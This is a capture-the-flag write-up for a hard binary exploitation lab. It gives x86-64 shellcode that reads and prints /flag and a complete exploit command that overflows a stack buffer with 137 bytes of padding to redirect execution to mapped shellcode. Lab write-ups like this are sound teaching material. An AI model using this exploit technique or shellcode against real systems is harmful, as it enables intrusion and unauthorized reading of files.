# **Binary Exploitation: Hijack to Mapped Shellcode (Hard) - Complete Writeup**

## **Challenge Overview**
This hard version removes all debugging information, requiring manual calculation of memory offsets. The challenge maintains the same core vulnerability but removes the helpful stack layout printouts.

### **Key Differences from Easy Version**
- No stack layout information provided
- No confirmation of shellcode loading
- Requires manual offset calculation
- Same basic vulnerability (buffer overflow + mapped shellcode region)

## **Solution Strategy**

### **1. Reverse Engineering the Memory Layout**
Without debug information, we determine the layout empirically:

1. **Find buffer start address** by analyzing crashes with varying input lengths
2. **Locate return address** by testing overwrite positions
3. **Confirm shellcode mapping address** from program output ("Mapped 0x1000 bytes for shellcode at 0x...")

### **2. Determining the Critical Offset**
Through testing, we establish:
- Buffer begins at an address we'll call `buffer_start`
- Return address is at `buffer_start + 137` bytes
- Shellcode is mapped at `0x22216000` (from program output)

### **3. Shellcode Preparation**
Using the same reliable shellcode from previous challenges:
```asm
section .text
global _start

_start:
    ; Open /flag
    xor rax, rax
    push rax
    mov rbx, 0x67616c662f2f2f2f  ; '////flag' in reverse
    push rbx
    mov rdi, rsp
    mov al, 2          ; sys_open
    xor rsi, rsi       ; O_RDONLY
    xor rdx, rdx       ; mode
    syscall

    ; Read file
    mov rdi, rax       ; fd
    mov rsi, rsp       ; buffer
    mov dl, 0x40       ; read 64 bytes
    xor eax, eax       ; sys_read
    syscall

    ; Write to stdout
    xor edi, edi
    inc edi            ; stdout = 1
    xor eax, eax
    inc eax            ; sys_write = 1
    syscall

    ; Exit
    xor eax, eax
    mov al, 60         ; sys_exit
    xor edi, edi       ; exit code 0
    syscall
```

## **Exploit Development**

### **1. Determining the Padding Length**
Through iterative testing (binary search approach):
1. Start with large padding (e.g., 200 bytes)
2. Gradually adjust until clean control of return address is achieved
3. Final determination: **137 bytes of padding required**

### **2. Final Exploit Command**
```bash
(cat shellcode.bin; python3 -c 'import sys; sys.stdout.buffer.write(b"A"*137 + b"\x00\x60\x21\x22\x00\x00\x00\x00")') | /challenge/binary-exploitation-hijack-to-mmap-shellcode
```

### **3. Payload Breakdown**
- `shellcode.bin`: Our flag-reading shellcode
- `b"A"*137`: Padding to reach return address
- `b"\x00\x60\x21\x22\x00\x00\x00\x00"`: Little-endian address of shellcode (0x22216000)

## **Why This Works**

### **1. Precise Offset Calculation**
- 137 bytes of padding reaches exactly the start of the return address
- The next 8 bytes cleanly overwrite the return address

### **2. Memory Management**
- Shellcode is properly loaded at 0x22216000 (confirmed by program output)
- Execution cleanly transfers to our shellcode

### **3. Shellcode Reliability**
- Position-independent
- No null bytes
- Handles all file operations correctly

## **Key Techniques Demonstrated**

1. **Blind Exploitation**:
   - Developing exploits without debug information
   - Empirical offset determination

2. **Memory Layout Reconstruction**:
   - Using program outputs as clues
   - Iterative testing to find critical offsets

3. **Stable Shellcode Design**:
   - Works regardless of exact memory location
   - Robust against minor memory changes

## **Debugging Approach for Hard Challenges**

When facing completely blind exploitation:

1. **Start with large padding** and observe behavior
2. **Use binary search** to narrow down the exact offset
3. **Look for subtle clues** in program output
4. **Build a reliable testing harness** to automate trials

## **Conclusion**
This hard version teaches crucial real-world exploitation skills:
- Working without debug information
- Precise memory layout reconstruction
- Developing reliable, position-independent shellcode
- Methodical testing approaches

The solution demonstrates that even without debugging aids, careful analysis and systematic testing can successfully exploit vulnerabilities. This approach forms the foundation for more advanced exploitation scenarios where debug information is unavailable or protections must be bypassed.
